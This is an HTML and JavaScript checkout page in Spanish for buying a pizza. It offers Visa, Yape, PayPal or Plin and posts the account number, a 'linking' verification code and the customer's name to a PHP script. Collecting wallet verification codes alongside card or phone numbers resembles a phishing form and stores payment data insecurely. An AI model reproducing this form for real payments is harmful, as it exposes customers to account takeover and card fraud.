<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pagar Pizza</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1b2838;
            color: #ffffff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2a475e;
            padding: 20px;
            width: 400px;
            border-radius: 8px;
            text-align: center;
        }
        .dropdown, .pizza-size {
            width: 100%;
            padding: 10px;
            font-size: 16px;
            border-radius: 5px;
            border: none;
            margin-bottom: 20px;
            background-color: #3b4d61;
            color: #ffffff;
        }
        .button {
            width: 100%;
            background-color: #66c0f4;
            color: #1b2838;
            padding: 10px;
            font-size: 16px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .modal {
            display: none;
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background-color: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
        }
        .modal-content {
            display: flex;
            background-color: #3498db;
            padding: 20px;
            border-radius: 8px;
            width: 600px;
            color: #ffffff;
            gap: 20px;
        }
        .modal-content img {
            width: 60px;
            margin-bottom: 10px;
        }
        .modal-content h2 {
            color: #bada55;
            font-size: 18px;
            margin-bottom: 10px;
        }
        .form-container {
            flex: 1;
        }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label {
            font-size: 14px;
            color: #ffffff;
        }
        input[type="text"] {
            width: 100%;
            padding: 8px;
            border-radius: 5px;
            border: none;
            font-size: 14px;
            margin-top: 5px;
        }
        .qr-container {
            display: none;
            justify-content: center;
            align-items: center;
            background-color: #ffffff;
            padding: 20px;
            border-radius: 8px;
            width: 150px;
            height: 150px;
        }
        .qr-container img {
            width: 100%;
            height: auto;
        }
        .action-buttons {
            display: flex;
            justify-content: space-around;
            margin-top: 15px;
        }
        .action-buttons button {
            width: 45%;
            padding: 10px;
            font-size: 14px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .btn-confirm {
            background-color: #9b59b6;
            color: #ffffff;
        }
        .btn-cancel {
            background-color: #e74c3c;
            color: #ffffff;
        }
    </style>
</head>
<body>

<div class="container">
    <h2>Método de Pago</h2>
    <p>Estás pagando por: <strong id="producto-nombre">Pizza</strong></p>

    <label for="pizza-size">Selecciona el tamaño de la pizza:</label>
    <select id="pizza-size" class="pizza-size">
        <option value="" disabled selected>Seleccione tamaño</option>
        <option value="Personal">Personal</option>
        <option value="Familiar">Familiar</option>
        <option value="XL">XL</option>
    </select>

    <label for="payment-method">Selecciona un método de pago:</label>
    <select id="payment-method" class="dropdown">
        <option value="" disabled selected>Seleccione un método</option>
        <option value="visa">Visa</option>
        <option value="yape">Yape</option>
        <option value="paypal">PayPal</option>
        <option value="plin">Plin</option>
    </select>

    <button class="button" onclick="continuar()">Continuar</button>
</div>

<!-- Modal de pago -->
<div class="modal" id="payment-modal">
    <div class="modal-content">
        <div class="form-container">
            <img id="payment-logo" src="" alt="Logo">
            <h2 id="payment-title"></h2>
            <div class="form-group">
                <label for="account-info">Ingrese los datos:</label>
                <input type="text" id="account-info" placeholder="">
            </div>
            <div class="form-group">
                <label for="verification-code">Código de Vinculación:</label>
                <input type="text" id="verification-code" placeholder="Ingrese el código de verificación">
            </div>
            <div class="form-group">
                <label for="nombre-cliente">Nombre completo:</label>
                <input type="text" id="nombre-cliente" placeholder="Ingrese su nombre completo">
            </div>
            <div class="action-buttons">
                <button class="btn-confirm" onclick="confirmPayment()">Realizar Pago</button>
                <button class="btn-cancel" onclick="closeModal()">Cancelar</button>
            </div>
        </div>
        <div class="qr-container" id="qr-container">
            <img id="qr-code" src="https://via.placeholder.com/150?text=QR+Code" alt="QR Code">
        </div>
    </div>
</div>

<script>
    function continuar() {
        const metodoPago = document.getElementById("payment-method").value;
        const pizzaSize = document.getElementById("pizza-size").value;
        const qrContainer = document.getElementById("qr-container");

        if (!pizzaSize) {
            alert("Por favor, selecciona el tamaño de la pizza.");
            return;
        }

        if (!metodoPago) {
            alert("Por favor, selecciona un método de pago.");
            return;
        }

        const paymentTitle = document.getElementById("payment-title");
        const paymentLogo = document.getElementById("payment-logo");
        const accountInfo = document.getElementById("account-info");
        const qrCode = document.getElementById("qr-code");

        qrContainer.style.display = "none";

        if (metodoPago === "visa") {
            paymentTitle.innerText = "Pagar con Visa";
            accountInfo.placeholder = "Ingrese el número de tarjeta Visa";
            paymentLogo.src = "images/visa.svg";
        } else if (metodoPago === "yape") {
            paymentTitle.innerText = "Pagar con Yape";
            accountInfo.placeholder = "Ingrese su número telefónico";
            paymentLogo.src = "images/yape.png";
            qrCode.src = "images/qr.jpg";
            qrContainer.style.display = "flex";
        } else if (metodoPago === "paypal") {
            paymentTitle.innerText = "Pagar con PayPal";
            accountInfo.placeholder = "Ingrese su correo de PayPal";
            paymentLogo.src = "images/paypal.jpeg";
        } else if (metodoPago === "plin") {
            paymentTitle.innerText = "Pagar con Plin";
            accountInfo.placeholder = "Ingrese su número telefónico";
            paymentLogo.src = "images/plin.webp";
            qrCode.src = "images/plin.webp";
            qrContainer.style.display = "flex";
        }

        document.getElementById("payment-modal").style.display = "flex";
    }

    function closeModal() {
        document.getElementById("payment-modal").style.display = "none";
    }

    function confirmPayment() {
        const pizzaSize = document.getElementById("pizza-size").value;
        const metodoPago = document.getElementById("payment-method").value;
        const cuenta = document.getElementById("account-info").value;
        const codigo = document.getElementById("verification-code").value;
        const nombre = document.getElementById("nombre-cliente").value;

        if (!cuenta || !codigo || !nombre) {
            alert("Por favor completa todos los campos.");
            return;
        }

        fetch("guardar_pago.php", {
            method: "POST",
            headers: {
                "Content-Type": "application/x-www-form-urlencoded"
            },
            body: `producto=Pizza&tamano=${encodeURIComponent(pizzaSize)}&metodo=${encodeURIComponent(metodoPago)}&cuenta=${encodeURIComponent(cuenta)}&codigo=${encodeURIComponent(codigo)}&nombre=${encodeURIComponent(nombre)}`
        })
        .then(response => response.text())
        .then(data => {
            alert(data);
            closeModal();
        })
        .catch(error => {
            console.error("Error:", error);
            alert("Hubo un error al guardar el pago.");
        });
    }
</script>
</body>
</html>
